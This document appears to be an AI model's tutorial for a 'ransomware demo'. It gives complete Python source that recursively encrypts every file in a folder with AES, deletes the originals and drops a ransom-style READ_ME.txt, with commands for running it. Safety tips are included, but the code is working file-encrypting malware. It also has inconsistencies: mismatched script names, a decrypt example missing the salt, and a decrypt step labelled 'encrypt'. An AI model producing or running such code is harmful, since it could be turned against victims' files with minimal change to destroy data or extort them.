# How to Run the Ransomware Demo 

## Step 1: Set Up a Safe Testing Environment

1. Create a virtual machine (recommended: VirtualBox or VMware)
2. Install Python on the VM
3. Create a dedicated test folder with dummy files
4. Open your vs code and your ransomware folder

## Step 2: Install Required Packages
Go to the terminal and type:
```bash
pip install cryptography
```

## Step 3: Create the Project Structure
Make a file and name it ransomware.py
```python
import os
import hashlib
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def derive_key(password: str, salt: bytes = None):
    """Key derivation function"""
    if salt is None:
        salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode()), salt

def encrypt_file(file_path: str, key: bytes):
    """Encrypt a single file"""
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    
    pad_length = 16 - (len(plaintext)) % 16
    plaintext += bytes([pad_length]) * pad_length
    
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    
    with open(file_path + '.encrypted', 'wb') as f:
        f.write(iv + ciphertext)
    
    os.remove(file_path)

def decrypt_file(file_path: str, key: bytes):
    """Decrypt a single file"""
    with open(file_path, 'rb') as f:
        data = f.read()
    
    iv = data[:16]
    ciphertext = data[16:]
    
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    pad_length = plaintext[-1]
    plaintext = plaintext[:-pad_length]
    
    original_path = file_path.replace('.encrypted', '')
    with open(original_path, 'wb') as f:
        f.write(plaintext)
    
    os.remove(file_path)

def process_directory(action: str, path: str, password: str, salt_hex: str = None):
    """Process all files in directory"""
    key, salt = derive_key(password, bytes.fromhex(salt_hex)) if salt_hex else derive_key(password)
    
    for root, _, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                if action == 'encrypt' and not file.endswith('.encrypted'):
                    encrypt_file(file_path, key)
                    print(f"Encrypted {file_path}")
                elif action == 'decrypt' and file.endswith('.encrypted'):
                    decrypt_file(file_path, key)
                    print(f"Decrypted {file_path}")
            except Exception as e:
                print(f"Error processing {file_path}: {str(e)}")
    
    if action == 'encrypt':
        note = f"""=== WARNING: EDUCATIONAL DEMO ONLY ===
Files encrypted with password: '{password}'
Salt (hex): {salt.hex()}
To decrypt: python ransomware_edu_demo.py decrypt /path/to/files {password} {salt.hex()}"""
        with open(os.path.join(path, 'READ_ME.txt'), 'w') as f:
            f.write(note)

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='Educational ransomware demo')
    parser.add_argument('action', choices=['encrypt', 'decrypt'], help='Action to perform')
    parser.add_argument('path', help='Path to process')
    parser.add_argument('password', help='Encryption/decryption password')
    parser.add_argument('salt_hex', nargs='?', help='Salt value in hex (for decryption)')
    args = parser.parse_args()
    
    if not os.path.exists(args.path):
        print(f"Path not found: {args.path}")
        exit(1)
    
    process_directory(args.action, args.path, args.password, args.salt_hex)
```

## Step 4: Running the Demo

1. **Encrypt test files** (in your safe test environment):
In the terminal run this code to encrypt the desired folder:
```bash
python ransomware.py encrypt "PATH-FOLDER-OF-YOUR-TEST-FILES" "PASSWORD-FOR-ENCRYPTION"
```
For example:
   ```bash
   python ransomware.py encrypt "C:\Users\Administrator\Downloads\test-folder" "test123"
   ```
   - This will create `.encrypted` versions of all files
   - Generate a `READ_ME.txt` with decryption instructions

2. **Decrypt test files** (after studying the encryption):
In the terminal run this code to encrypt the desired folder:
```bash
python ransomware.py decrypt "PATH-FOLDER-OF-YOUR-TEST-FILES" "PASSWORD-FOR-ENCRYPTION"
```
For example:
   ```bash
   python ransomware_edu_demo.py decrypt ~/Downloads/test-files "my_password123" "a1b2c3d4e5f6..."
   ```

## Safety Precautions

1. Only run on a virtual machine with no network connection
2. Only encrypt files you created specifically for testing
3. Delete all test files and VM after completing your study
4. Never use real passwords you use elsewhere

## What You Should Learn From This

1. How symmetric encryption works
2. The importance of proper key management
3. Why ransomware is so damaging
4. How to build defenses against such attacks

Would you like me to explain any specific part of the code in more detail or suggest defensive programming techniques against such attacks?
